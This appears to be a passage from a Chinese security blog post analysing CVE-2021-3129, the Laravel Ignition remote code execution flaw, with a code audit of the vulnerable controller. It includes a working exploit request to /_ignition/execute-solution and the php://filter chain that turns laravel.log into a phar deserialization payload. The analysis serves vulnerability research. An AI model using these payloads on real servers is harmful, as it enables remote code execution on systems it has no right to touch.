<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 210</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203019.png" alt></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>最最核心的原理还是反序列化，但是每一个反序列化都有着花里胡哨的入口。前几天做测试的时候发现低权限用户的操作被记录在日志中，可以被管理员审计。当时想着看能不能弹个框什么的，但是过滤做的挺好也没成功。这个漏洞给了不少思路，攻击者可以将几乎任意字符写在日志中，并且触发发序列化实现远程代码执行。</p>
<p>在这其中，涉及到了编码与解码，不同字符在这其中的处理方式给了利用本漏洞的机会。我用一道CTF题来举例子。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">	<span class="comment">#it is running under default installation of Ubuntu 18.04 + PHP7.2 + Apache.</span></span><br><span class="line">	($_=@$_GET[<span class="string">'orange'</span>]) &amp;&amp; @substr(file($_)[<span class="number">0</span>], <span class="number">0</span>, <span class="number">6</span>) == <span class="string">'@&lt;?php'</span> ? <span class="keyword">include</span>($_) : highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过session.upload生成的session文件的开头为<strong>upload_progress_</strong>，并不符合题目要求。但是在PHP中，<strong>base64会自动忽略非法字符</strong>。给上传的文件名前面加上“ZZ”这两个字符，前缀拼接上ZZ成为<strong>upload_progress_ZZ</strong>，这个前缀在解码三次之后都会变成非法字符，导致前缀整个消失。基于这个特性就可以绕过限制，匹配<strong>@&lt;?php</strong>。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203102.png" alt></p>
<p>同样把思路拽回到这个漏洞当中来，本来日志文件的格式是不符合命令执行格式的，通过编码解码的特点，将多余的字符消去剩下可执行格式，完成反序列化。</p>
<p>我们看一下报错响应，发送的json数据中的viewFile参数值被写入的log中。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203125.png" alt></p>
<p>从服务器直接打开log文件，所有的绿色的部分为写入log文件的部分。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203206.png" alt></p>
<p>接下来就是沿用CTF题目的思路往下，将log文件变成一个phar文件，配合phar伪协议执行反序列化。但是其中还有几个需要处理的问题。</p>
<p>首先上面说的base64在解码的时候会忽略掉非法字符，但是不会忽略的”=“。如果在使用base64解码的字符串中含有等于号，会造成报错返回空值。我们所注入的内容在日志中只占很小一部分，很难测试出一组合适的拼接字符，在特定次数的base64解码后让多余字符消失。</p>
<p>而且还有一个问题，日志前面的时间不可控，进行解码之后的内容也就不可控。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(base64_decode(base64_decode(<span class="string">'[2022-04-30 23:59:11]'</span>)));</span><br><span class="line">string(0) <span class="string">""</span></span><br><span class="line">php &gt; var_dump(base64_decode(base64_decode(<span class="string">'[2022-04-12 23:59:11]'</span>)));</span><br><span class="line">string(1) <span class="string">"2"</span></span><br></pre></td></tr></table></figure>

<p>还有，报错日志中包含了绝对路径，所以不能使用一个payload通杀，需要针对每一个目标生成一个新的payload。</p>
<p>还有还有，我们注入的payload会在日志中出现两次。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203236.png" alt></p>
<p>最终的日志格式应该是</p>
<blockquote>
<p>[prefix] <strong>payload</strong> [midfix] <strong>payload</strong> [suffix]</p>
</blockquote>
<p>现在我们对log记录机制个格式有一个大致的了解，接下来就是解决这些困难的方法。首先上面提到应为不合法字符的存在，会导致base64解码跳过。利用这个机制，我们可以清空日志文件。</p>
<p>使用utf-16和utf-8两种编码相互转换，导致出错从而清空日志文件。并且因为日志中会出现两次payload，而UTF-16读取的是两个字节，可以在payload后面加一个字节，吞掉第二次出现的payload。注意这里有个小细节，当payload是奇数的时候第二个payload会正常解码，反之是第一个。</p>
<p>来回转换后除了payload以外的字符都不是base64解码的合法字符了，然后使用base64解码就可以只剩下payload存在。</p>
<p>但是这样我们相当于将一个字节的utf-8编码扩展为了两个字节的utf-16编码，默认使用了空字节来填充。但是在file_get_contents中使用空字节会报错。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning:  file_get_contents() expects parameter 1 to be a valid path, string given <span class="keyword">in</span> php shell code on line 1</span><br></pre></td></tr></table></figure>

<p>很幸运php提供给了我们解决方法。使用<strong>convert.quoted-printable-decode</strong>过滤器可以将空字符”\00”编码为”=00”写入log中，并且也有对应的解码器<strong>convert.quoted-printable-decode</strong>将其解码。</p>
<p>最终的编码/转码链如下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</span><br></pre></td></tr></table></figure>

<p>最终梳理一下攻击链</p>
<ol>
<li>利用UTF-8与UTF-16的相互转换加上base64解码，将日志清空。</li>
<li>给payload加上一个前缀AA，为了对齐两个比特。</li>
<li>将payload写入到log中。</li>
<li>重复第一步，清除非payload部分，只留下遵守base64编码的payload。</li>
<li>使用phar伪协议触发反序列化实现命令执行。</li>
</ol>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p><strong>vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\\<span class="title">Ignition</span>\\<span class="title">Http</span>\\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\\<span class="title">Ignition</span>\\<span class="title">Http</span>\\<span class="title">Requests</span>\\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\\<span class="title">IgnitionContracts</span>\\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\\<span class="title">Foundation</span>\\<span class="title">Validation</span>\\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest $request,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository $solutionProviderRepository</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>&#123;</span><br><span class="line">        $solution = $request-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        $solution-&gt;run($request-&gt;get(<span class="string">'parameters'</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">''</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>solution调用了run方法，并传参parameters。这里就是传入点，并没做任何过滤。跟进solution方法的run函数。</p>
<p><strong>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $output = <span class="keyword">$this</span>-&gt;makeOptional($parameters);</span><br><span class="line">        <span class="keyword">if</span> ($output !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            file_put_contents($parameters[<span class="string">'viewFile'</span>], $output);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span><span class="params">(array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $originalContents = file_get_contents($parameters[<span class="string">'viewFile'</span>]);</span><br><span class="line">        $newContents = str_replace(<span class="string">'$'</span>.$parameters[<span class="string">'variableName'</span>], <span class="string">'$'</span>.$parameters[<span class="string">'variableName'</span>].<span class="string">" ?? ''"</span>, $originalContents);</span><br><span class="line"></span><br><span class="line">        $originalTokens = token_get_all(Blade::compileString($originalContents));</span><br><span class="line">        $newTokens = token_get_all(Blade::compileString($newContents));</span><br><span class="line"></span><br><span class="line">        $expectedTokens = <span class="keyword">$this</span>-&gt;generateExpectedTokens($originalTokens, $parameters[<span class="string">'variableName'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($expectedTokens !== $newTokens) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $newContents;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>参数传入了run函数之后也没有进行过滤，传入了makeOptional函数中。之后又被当作了file_get_contents的参数执行，被执行的参数为传入的json格式数据的viewFile参数，最终导致了反序列化漏洞的发生。</p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>最后附上crisprss师傅的exp：<a href="https://github.com/crisprss/Laravel_CVE-2021-3129_EXP" target="_blank" rel="noopener">https://github.com/crisprss/Laravel_CVE-2021-3129_EXP</a></p>

      
    </div>

    

    
    
    

    

    
      
    
    

    
      <div>
        




  



<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>安大侠</li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    
    <a href="http://ama666.cn/2021/05/19/Research on CVE-2021-3129/" title="Research on CVE-2021-3129/CVE-2021-3129详解">http://ama666.cn/2021/05/19/Research on CVE-2021-3129/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
</ul>

      </div>
    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/03/08/RCE-ByPass/" rel="next" title="RCE ByPass">
                <i class="fa fa-chevron-left"></i> RCE ByPass
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/07/13/phishing using Gophish/" rel="prev" title="Phishing using Gophish/Gophish实战">
                Phishing using Gophish/Gophish实战 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
            
              <p class="site-author-name" itemprop="name">安大侠</p>
              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">66</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">12</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">标签</span>
                  
                </div>
              
            </nav>
          

          

          

          

          
             <div class="cc-license motion-element" itemprop="license">
              
              
                
              
              
              
              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
             </div>
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Research-on-CVE-2021-3129"><span class="nav-number">1.</span> <span class="nav-text">Research on CVE-2021-3129</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Setting-up-the-environment"><span class="nav-number">1.1.</span> <span class="nav-text">Setting up the environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation-process"><span class="nav-number">1.2.</span> <span class="nav-text">Exploitation process</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability-principle"><span class="nav-number">1.3.</span> <span class="nav-text">Vulnerability principle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-Audit"><span class="nav-number">1.4.</span> <span class="nav-text">Code Audit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">1.5.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2021-3129详解"><span class="nav-number">2.</span> <span class="nav-text">CVE-2021-3129详解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建环境"><span class="nav-number">2.1.</span> <span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现过程"><span class="nav-number">2.2.</span> <span class="nav-text">复现过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计"><span class="nav-number">2.4.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.5.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">安大侠</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="总访客量">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="post-meta-divider">|</span>
  

  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="总访问量">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.2"></script>

  <script src="/js/motion.js?v=7.1.2"></script>



  
  


  <script src="/js/affix.js?v=7.1.2"></script>

  <script src="/js/schemes/pisces.js?v=7.1.2"></script>




  
  <script src="/js/scrollspy.js?v=7.1.2"></script>
<script src="/js/post-details.js?v=7.1.2"></script>



  


  <script src="/js/next-boot.js?v=7.1.2"></script>


  

  

  

  


  


  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
